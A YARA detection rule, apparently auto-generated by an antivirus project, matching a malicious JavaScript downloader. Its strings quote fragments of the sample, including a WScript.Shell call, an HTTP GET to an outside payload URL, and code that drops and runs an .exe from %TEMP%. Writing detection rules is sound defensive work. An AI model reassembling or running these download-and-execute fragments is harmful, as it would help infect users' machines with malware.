rule sig_20160328_77cc0a2a684e03acb4c8420913cedef9 {
  meta:
    description = "datamaliciousorder - file 20160328_77cc0a2a684e03acb4c8420913cedef9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d5d6907611a6774c6e89603c6c13d0f5e097291fe20da041cb80ff7eb8dbe047"

  strings:
    $s1  = "function Ljcyhrk() {return Gqjhwmtdk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"uzRTxuREAELO3.exe\";};" fullword ascii
    $s2  = "Amovmn[Zkyad](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Mcofjgo](Kmfyjmq() * 11)} while (Amovmn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Eyzzt(Ywvqhsama, Wsolv){return Ywvqhsama - Wsolv;};" fullword ascii
    $s5  = "var Gqjhwmtdk = function Lrqcdc() {return WScript[Lcaqoywf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dpqnk(Actnazq){Gqjhwmtdk[\"Run\"](Actnazq, Bfhzazo, Bfhzazo);};" fullword ascii
    $s7  = "function Esbkmjcr(Nlrptp) {var Pdyap = (1, 2, 3, 4, 5, Nlrptp); return Pdyap;};" fullword ascii
    $s8  = "function Zpouvfb(){return Qoyaouemur;};" fullword ascii
    $s9  = "var Ejxwz = false;" fullword ascii
    $s10 = "function Kmfyjmq(){return 22;};" fullword ascii
    $s11 = "Jramgoeig = true; " fullword ascii
    $s12 = "function Cllzv()" fullword ascii
    $s13 = "return Eyzzt(Gujvqfkb, Pbhskbg);" fullword ascii
    $s14 = "Ejxwz = true; " fullword ascii
    $s15 = "var Jramgoeig = false;" fullword ascii
    $s16 = "var Gwruvyqw = new this[\"Date\"]();" fullword ascii
    $s17 = "var Miqyboqf = false;" fullword ascii
    $s18 = " while (Ubcsb){" fullword ascii
    $s19 = "function Xgiiswrcap() {return ((Jramgoeig == true) && (Jramgoeig == Ejxwz)) ? 1 : Bfhzazo;};" fullword ascii
    $s20 = "function Lcaduvq(){return Lcaqoywf;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}